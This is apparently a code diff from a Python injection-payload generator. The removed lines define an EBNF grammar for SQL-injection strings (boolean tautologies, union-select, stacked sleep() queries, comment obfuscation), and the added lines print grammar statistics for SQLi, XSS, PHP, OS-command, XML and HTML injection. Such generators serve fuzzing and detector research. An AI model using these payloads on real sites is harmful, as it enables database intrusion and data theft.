+                    return True  # 如果找到目标符号，返回True
+                if token in self.payload_dict:
+                    if self.is_accessible(symbol, token, visited):
+                        return True
 
-        # Obfuscation
-        'inlineCmt': (('/**/',),),
-        'blank': (('[blank]',),),
-        'wsp': (('blank',),
-                ('inlineCmt',)),
+        return False
 
-        # Syntax-repairing
-        'par': ((')',),),
-        'cmt': (('#',),
-                ('--', 'blank')),
-        # SQL functions
-        'parOpen': (('(',),),
-        'funcSleep': (("sleep", 'parOpen', '[terDigitExcludingZero]', 'par'),),
 
-        # SQL Operators and Keyword
-        'opNot': (("!",),
-                  ("not",)),
-        'opBinInvert': (("~",),),
-        'opEqual': (("=",),),
-        'opLt': (("<",),),
-        'opGt': ((">",),),
-        'opLike': (("like",),),
-        'opIs': (("is",),),
-        'opMinus': (("-",),),
-        'opOr': (("or",),
-                 ("||",)),
-        'opAnd': (("and",),
-                  ("&&",)),
-        'opSel': (("select",),),
-        'opUni': (("union",),),
-        'opSem': ((";",),),
+if __name__ == "__main__":
+    # print(Payload('SQLI').injection)
+    # print(Payload('XSS').injection)
+    # print(Payload('PHPI').injection)
+    # print(Payload('OSI').injection)
+    # print(Payload('XMLI').injection)
+    # print(Payload('HTMLI').injection)
 
-        # 'terOne': (("1",),),
-        'terSQuote': (("'",),),
-        'terDQuote': (("\"",),),
-        'terDigitZero': (("0",),),
-        'terDigitOne': (("1",),),
-        'terDigitExcludingZero': (("1",), ('2',), ('3',), ('4',), ('5',), ('6',), ('7',), ('8',), ('9',)),
-        'terDigitIncludingZero': (("0",), ("1",), ('2',), ('3',), ('4',), ('5',), ('6',), ('7',), ('8',), ('9',)),
-        'terChar': (("a",),),
-    }
+    print('SQLI Stastistics:')
+    Payload('SQLI').grammar_characteristics()
 
-    ### SQLi Grammer ####
-    ebnfSQLi = {
-        ### Injection Context ###
-        'root': (('numericContext',),
-                 ('sQuoteContext',),
-                 ('dQuoteContext',)),
-        'numericContext': (('terDigitZero', 'wsp', 'booleanAttack', 'wsp'),
-                           ('terDigitZero', 'par', 'wsp', 'booleanAttack', 'wsp', 'opOr', 'parOpen', 'terDigitZero'),
-                           ('terDigitZero', 'par', 'wsp', 'sqliAttack', 'cmt'),),
-        'sQuoteContext': (('terSQuote', 'wsp', 'booleanAttack', 'wsp', 'opOr', 'terSQuote'),
-                          ('terSQuote', 'par', 'wsp', 'booleanAttack', 'wsp', 'opOr', 'parOpen', 'terSQuote'),
-                          ('terSQuote', 'par', 'wsp', 'sqliAttack', 'cmt')),
-        'dQuoteContext': (('terDQuote', 'wsp', 'booleanAttack', 'wsp', 'opOr', 'terDQuote'),
-                          ('terDQuote', 'par', 'wsp', 'booleanAttack', 'wsp', 'opOr', 'parOpen', 'terDQuote'),
-                          ('terDQuote', 'par', 'wsp', 'sqliAttack', 'cmt')),
-        'sqliAttack': (('unionAttack',),
-                       ('piggyAttack',),
-                       ('booleanAttack',)),
+    print('XSS Stastistics:')
+    Payload('XSS').grammar_characteristics()
 
-        ### Piggy-backed Attacks ###
-        'piggyAttack': (('opSem', 'opSel', 'wsp', 'funcSleep'),),
+    print('PHPI Stastistics:')
+    Payload('PHPI').grammar_characteristics()
 
-        ### Union Attacks ###
-        'cols': (('terDigitZero',),),
-        'unionPostfix': (("all", 'wsp'),
-                         ("distinct", 'wsp')),
-        'unionConf': (('opUni',),
-                      ('/*!', "50000", 'opUni', '*/')),
-        'unionAttack': (('unionConf', 'wsp', 'unionPostfix', 'opSel', 'wsp', 'cols'),
-                        ('unionConf', 'wsp', 'unionPostfix', 'parOpen', 'opSel', 'wsp', 'cols', 'par')),
+    print('OSI Stastistics:')
+    Payload('OSI').grammar_characteristics()
 
-        # boolean values which evaluate to false
-        # falseConst = "false" | "fa" , [inlineCmt] , "lse";
-        'falseConst': (('false',),),
-        'falseAtom': (('wsp', 'falseConst'),
-                      ('wsp', 'terDigitZero'),
-                      ('terSQuote', 'terSQuote')),
-        'unaryFalse': (('falseAtom',),
-                       ('wsp', 'opNot', 'wsp', 'trueAtom'),
-                       ('wsp', 'opNot', 'opBinInvert', 'falseAtom')),
-        'booleanFalseExpr': (('unaryFalse',),),
-        'orAttack': (('opOr', 'booleanTrueExpr'),),
-        'andAttack': (('opAnd', 'booleanFalseExpr'),),
-        'booleanAttack': (('orAttack',),
-                          ('andAttack',)),
+    print('XMLI Stastistics:')
+    Payload('XMLI').grammar_characteristics()
 
-        ### Boolean-based Attacks ###
-        # boolean values which evaluate to true
-        # trueConst = "true" | "tr" , [inlineCmt] , "ue";
-        'trueConst': (('true',),),
-        'trueAtom': (('trueConst',),
-                     ('terDigitOne',)),
-        'unaryTrue': (('wsp', 'trueAtom'),
-                      ('wsp', 'opNot', 'wsp', 'falseAtom'),
-                      ('opBinInvert', 'wsp', 'falseAtom')),
-        'binaryTrue': (('unaryTrue', 'opEqual', 'wsp', 'parOpen', 'unaryTrue', 'par'),
-                       ('unaryFalse', 'opEqual', 'wsp', 'parOpen', 'unaryFalse', 'par'),
-                       ('terSQuote', 'terChar', 'terSQuote', 'opEqual', 'terSQuote', 'terChar', 'terSQuote'),
-                       ('terDQuote', 'terChar', 'terDQuote', 'opEqual', 'terDQuote', 'terChar', 'terDQuote'),
-                       ('unaryFalse', 'opLt', 'parOpen', 'unaryTrue', 'par'),
-                       ('unaryTrue', 'opGt', 'parOpen', 'unaryFalse', 'par'),
-                       ('wsp', 'trueAtom', 'wsp', 'opLike', 'wsp', 'trueAtom'),
-                       ('unaryTrue', 'wsp', 'opIs', 'wsp', 'trueConst'),
-                       ('unaryFalse', 'wsp', 'opIs', 'wsp', 'falseConst'),
-                       ('unaryTrue', 'opMinus', 'parOpen', 'unaryFalse', 'par')),
-        'booleanTrueExpr': (('unaryTrue',),
-                            ('binaryTrue',)),
+    print('HTMLI Stastistics:')
+    Payload('HTMLI').grammar_characteristics()
 
-        # Obfuscation
-        'inlineCmt': (('/**/',),),
-        'blank': (('[blank]',),),
-        'wsp': (('blank',),
-                ('inlineCmt',)),
 
-        # Syntax-repairing
-        'par': ((')',),),
-        'cmt': (('#',),
-                ('--', 'blank')),
-        # SQL functions
-        'parOpen': (('(',),),
-        'funcSleep': (("sleep", 'parOpen', '[terDigitExcludingZero]', 'par'),),
-
-        # SQL Operators and Keyword
-        'opNot': (("!",),
-                  ("not",)),
-        'opBinInvert': (("~",),),
-        'opEqual': (("=",),),
-        'opLt': (("<",),),
-        'opGt': ((">",),),
-        'opLike': (("like",),),
-        'opIs': (("is",),),
-        'opMinus': (("-",),),
-        'opOr': (("or",),
-                 ("||",)),
-        'opAnd': (("and",),
-                  ("&&",)),
-        'opSel': (("select",),),
-        'opUni': (("union",),),
-        'opSem': ((";",),),
-
-        # 'terOne': (("1",),),
-        'terSQuote': (("'",),),
-        'terDQuote': (("\"",),),
-        'terDigitZero': (("0",),),
-        'terDigitOne': (("1",),),
-        'terDigitExcludingZero': (("1",), ('2',), ('3',), ('4',), ('5',), ('6',), ('7',), ('8',), ('9',)),
-        'terDigitIncludingZero': (("0",), ("1",), ('2',), ('3',), ('4',), ('5',), ('6',), ('7',), ('8',), ('9',)),
-        'terChar': (("a",),),
-    }
-
-    def __init__(self):
-        handlist = list()
-        for i in self.eventHandle:
-            temp = list(i)[:]
-            for j in range(len(temp)):
-                temp[j] = 'char' + temp[j].upper()
-            handlist.append(tuple(temp))
-        self.ebnfXSS['eventAttr'] = tuple(handlist)
-
-        handlist = list()
-        for i in self.tagHandle:
-            temp = list(i)[:]
-            for j in range(len(temp)):
-                temp[j] = 'char' + temp[j].upper()
-            handlist.append(tuple(temp))
-        self.ebnfXSS['tagAttr'] = tuple(handlist)
